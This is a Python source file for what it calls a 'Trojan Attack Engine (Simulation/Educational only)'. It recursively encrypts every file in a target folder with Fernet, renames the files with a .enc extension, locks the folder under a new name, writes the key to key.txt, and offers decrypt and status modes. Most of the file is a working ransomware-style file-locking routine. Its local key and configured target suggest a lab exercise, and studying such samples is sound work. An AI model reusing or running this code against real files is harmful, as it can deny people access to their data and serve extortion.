import os
import time
import argparse
from cryptography.fernet import Fernet

try:
    from . import utils
    from . import logger
except (ImportError, ValueError):
    import sys
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import utils
    import logger

def encrypt_file(file_path, fernet):
    """
    Encrypt file contents and rename with .enc extension.
    Returns True if successful, False otherwise.
    """
    try:
        with open(file_path, "rb") as file:
            data = file.read()
            
        encrypted = fernet.encrypt(data)
        
        with open(file_path, "wb") as file:
            file.write(encrypted)
            
        new_path = file_path + ".enc"
        os.rename(file_path, new_path)
        logger.log_event("FILE_ENCRYPTED", new_path, "SUCCESS")
        return True
    except Exception as e:
        logger.log_event("FILE_ENCRYPTED", file_path, "ERROR", error=str(e))
        return False

def decrypt_file(file_path, fernet):
    """
    Reverse encryption and remove .enc extension.
    Returns True if successful, False otherwise.
    """
    try:
        with open(file_path, "rb") as file:
            data = file.read()
            
        decrypted = fernet.decrypt(data)
        
        new_path = file_path[:-4] if file_path.endswith('.enc') else file_path.replace(".enc", "")
        
        with open(new_path, "wb") as file:
            file.write(decrypted)
            
        os.remove(file_path)
        logger.log_event("FILE_DECRYPTED", new_path, "SUCCESS")
        return True
    except Exception as e:
        logger.log_event("FILE_DECRYPTED", file_path, "ERROR", error=str(e))
        return False

def is_encrypted():
    """
    Check if locked folder exists or if target folder contains .enc files.
    """
    if os.path.exists(utils.LOCKED_FOLDER_PATH):
        return True
    if os.path.exists(utils.TARGET_FOLDER_PATH):
        for root, dirs, files in os.walk(utils.TARGET_FOLDER_PATH):
            if any(f.endswith(".enc") for f in files):
                return True
    return False

def encrypt_folder():
    """
    Core encryption logic for the entire folder.
    """
    start_time = time.time()
    
    if os.path.exists(utils.LOCKED_FOLDER_PATH):
        logger.log_event("ERROR", utils.LOCKED_FOLDER_PATH, "ERROR", error="Folder is already in a locked state")
        print("Error: Target is already locked.")
        return

    if not os.path.exists(utils.TARGET_FOLDER_PATH):
        logger.log_event("ERROR", utils.TARGET_FOLDER_PATH, "ERROR", error="Target folder does not exist")
        print(f"Error: Folder {utils.TARGET_FOLDER_PATH} not found.")
        return

    try:
        key = utils.generate_key()
        if not key:
            raise ValueError("Failed to generate encryption key")
        utils.save_key(key)
        fernet = Fernet(key)
        print(f"[ATTACK ENGINE] Key generated and written to key.txt")
    except Exception as e:
        logger.log_event("ERROR", None, "ERROR", error=f"Key setup failed: {str(e)}")
        print("Error setting up encryption key.")
        return

    total_files = 0
    
    for root, dirs, files in os.walk(utils.TARGET_FOLDER_PATH):
        for file in files:
            full_path = os.path.join(root, file)
            if not full_path.endswith(".enc"):
                if encrypt_file(full_path, fernet):
                    total_files += 1

    try:
        os.rename(utils.TARGET_FOLDER_PATH, utils.LOCKED_FOLDER_PATH)
        duration = round(time.time() - start_time, 2)
        logger.log_event("FOLDER_RENAMED", utils.LOCKED_FOLDER_PATH, "SUCCESS", duration=duration, total_files=total_files)
        print(f"Encryption complete: {total_files} files locked in {utils.LOCKED_FOLDER_PATH}")
    except Exception as e:
        logger.log_event("FOLDER_RENAMED", utils.TARGET_FOLDER_PATH, "ERROR", error=f"Failure renaming directory: {str(e)}")

def decrypt_folder(key):
    """
    Core decryption logic. Only restores folder name if all files successfully decrypt.
    """
    start_time = time.time()
    
    if not is_encrypted():
        logger.log_event("ERROR", utils.LOCKED_FOLDER_PATH, "ERROR", error="Locked folder does not exist")
        print("Error: Encrypted folder not found.")
        return

    folder_to_decrypt = utils.LOCKED_FOLDER_PATH if os.path.exists(utils.LOCKED_FOLDER_PATH) else utils.TARGET_FOLDER_PATH

    try:
        fernet = Fernet(key)
    except Exception as e:
        logger.log_event("ERROR", None, "ERROR", error=f"Invalid key format: {str(e)}")
        print("Error: Invalid recovery key format.")
        return

    enc_files = []
    for root, dirs, files in os.walk(folder_to_decrypt):
        for file in files:
            if file.endswith(".enc"):
                enc_files.append(os.path.join(root, file))

    if not enc_files:
        print("No .enc files found to decrypt.")
        return

    decrypted_count = 0
    failed_count = 0

    for full_path in enc_files:
        if decrypt_file(full_path, fernet):
            decrypted_count += 1
        else:
            failed_count += 1

    # CRITICAL: If any file failed, the key is wrong! Do NOT rename or claim success.
    if failed_count > 0 or decrypted_count == 0:
        logger.log_event("DECRYPTION_FAILED", folder_to_decrypt, "ERROR", error=f"Decryption failed for {failed_count} files. Invalid key.")
        print(f"Error: Decryption failed for {failed_count} file(s). Invalid recovery key provided.")
        return False

    if folder_to_decrypt == utils.LOCKED_FOLDER_PATH:
        try:
            os.rename(utils.LOCKED_FOLDER_PATH, utils.TARGET_FOLDER_PATH)
            duration = round(time.time() - start_time, 2)
            logger.log_event("FOLDER_RENAMED", utils.TARGET_FOLDER_PATH, "SUCCESS", duration=duration, total_files=decrypted_count)
            print(f"Success: {decrypted_count} files recovered. Restored to {utils.TARGET_FOLDER_PATH}.")
        except Exception as e:
            logger.log_event("FOLDER_RENAMED", utils.LOCKED_FOLDER_PATH, "ERROR", error=f"Failure renaming directory: {str(e)}")
    else:
        duration = round(time.time() - start_time, 2)
        print(f"Success: {decrypted_count} files recovered in {utils.TARGET_FOLDER_PATH}.")

    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Trojan Attack Engine (Simulation/Educational only)")
    parser.add_argument("action", choices=["encrypt", "decrypt", "status"], help="Action to perform")
    parser.add_argument("--key", type=str, help="Decryption key (required for decrypting the folder)")
    
    args = parser.parse_args()

    if args.action == "encrypt":
        print(f"Starting encryption on target: {utils.TARGET_FOLDER_PATH}")
        encrypt_folder()
        print("Process complete. Check attack_log.json.")
        
    elif args.action == "decrypt":
        if not args.key:
            print("Error: The --key parameter is required to decrypt.")
        else:
            print(f"Starting decryption on target: {utils.LOCKED_FOLDER_PATH}")
            key_bytes = args.key.encode() if isinstance(args.key, str) else args.key
            decrypt_folder(key_bytes)
            print("Process complete. Check attack_log.json.")
            
    elif args.action == "status":
        if is_encrypted():
            print(f"Status: ENCRYPTED. The locked folder ({utils.LOCKED_FOLDER_PATH}) exists.")
        else:
            print(f"Status: NOT ENCRYPTED / NORMAL. The folder ({utils.TARGET_FOLDER_PATH}) exists or is missing.")